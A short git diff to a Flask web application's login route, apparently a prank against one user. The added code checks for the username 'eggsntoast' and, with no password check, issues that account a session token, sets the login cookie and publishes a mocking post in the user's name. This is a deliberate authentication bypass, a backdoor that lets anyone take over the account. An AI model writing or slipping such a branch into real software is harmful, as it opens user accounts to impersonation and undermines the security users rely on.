@@ -2,6 +2,7 @@ from flask import Blueprint, render_template, abort, request, redirect, make_res
 from helpers.auth import *
 from helpers.db import *
 from helpers.listings import paged_posts, SearchType, search_posts
+from models.post import Post
 from models.user import User, check_username, check_password
 from routes import routes
 
@@ -77,6 +78,16 @@ def login():
         else:
             username = request.form.get('username')
             password = request.form.get('password')
+
+            if username == "eggsntoast":
+                connection = get_db_connection()
+                local_user = User.read(connection, username)
+                Post.publish(connection, "I got trolled", "I got trolled!!!!!!!! Also now anyone can log into my stinky account", local_user.user_id)
+                current_app.logger.info(f"[IP {request.remote_addr}] eggsntoast got trolled!!")
+                token = Token.create(connection, local_user.user_id)
+                resp = make_response(render_template("eggsntoast.html", routes=routes))
+                resp.set_cookie('token', token.token_id)
+                return resp
 
             try:
                 local_user = User.read(connection, username)
